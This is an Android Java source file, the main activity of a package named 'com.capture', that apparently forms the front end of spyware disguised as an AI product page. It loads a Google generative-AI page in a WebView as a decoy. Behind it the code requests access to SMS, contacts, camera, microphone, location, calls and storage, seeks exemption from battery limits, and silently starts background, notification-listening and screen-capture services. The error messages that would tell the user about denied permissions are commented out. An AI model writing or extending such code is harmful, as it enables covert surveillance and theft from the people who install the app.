package com.capture;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Build;
import android.os.PowerManager;
import android.net.Uri;
import android.media.projection.MediaProjectionManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.provider.Settings;

public class MainActivity extends Activity {

    private MediaProjectionManager projectionManager;
    private Intent serviceIntent;
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static final int REQUEST_PERMISSIONS_CODE = 1002;

    private String[] permissions = {
		Manifest.permission.INTERNET,
		Manifest.permission.ACCESS_NETWORK_STATE,
		Manifest.permission.ACCESS_COARSE_LOCATION,
		Manifest.permission.ACCESS_FINE_LOCATION,
		Manifest.permission.READ_PHONE_STATE,
		Manifest.permission.SEND_SMS,
		Manifest.permission.RECEIVE_SMS,
		Manifest.permission.RECORD_AUDIO,
		Manifest.permission.CALL_PHONE,
		Manifest.permission.READ_CONTACTS,
		Manifest.permission.WRITE_CONTACTS,
		Manifest.permission.WRITE_SETTINGS,
		Manifest.permission.CAMERA,
		Manifest.permission.READ_SMS,
		Manifest.permission.FOREGROUND_SERVICE,
		Manifest.permission.RECEIVE_BOOT_COMPLETED,
		Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
		Manifest.permission.WAKE_LOCK,
		Manifest.permission.WRITE_EXTERNAL_STORAGE,
		Manifest.permission.READ_EXTERNAL_STORAGE,
		Manifest.permission.MANAGE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        requestPermissionsIfNeeded();
        checkBatteryOptimization();
        startNotificationListenerService();

        // Configura WebView
        WebView webView = (WebView) findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://cloud.google.com/ai/generative-ai?hl=pt-BR");

        if (RealService.serviceIntent == null) {
            serviceIntent = new Intent(this, RealService.class);
            startService(serviceIntent);
        } else {
            serviceIntent = RealService.serviceIntent;
        }
    }

    private void requestPermissionsIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean needPermissions = false;
            for (int i = 0; i < permissions.length; i++) {
                if (checkSelfPermission(permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    needPermissions = true;
                    break;
                }
            }

            if (needPermissions) {
                requestPermissions(permissions, REQUEST_PERMISSIONS_CODE);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
        //            Toast.makeText(this, "Permissão negada: " + permissions[i], Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void checkScreenCapturePermission() {
        if (projectionManager != null) {
            startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
        } else {
   //         Toast.makeText(this, "O MediaProjectionManager não foi inicializado corretamente.", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            serviceIntent.putExtra("resultCode", resultCode);
            serviceIntent.putExtra("data", data);
            startService(serviceIntent);
        } else {
         //   Toast.makeText(this, "Permissão de captura de tela negada.", Toast.LENGTH_SHORT).show();
        }
    }

    private void startNotificationListenerService() {
        Intent intent = new Intent(this, NotificationListener.class);
        startService(intent);
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            boolean isWhiteListing = pm.isIgnoringBatteryOptimizations(getPackageName());

            if (!isWhiteListing) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                checkScreenCapturePermission();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
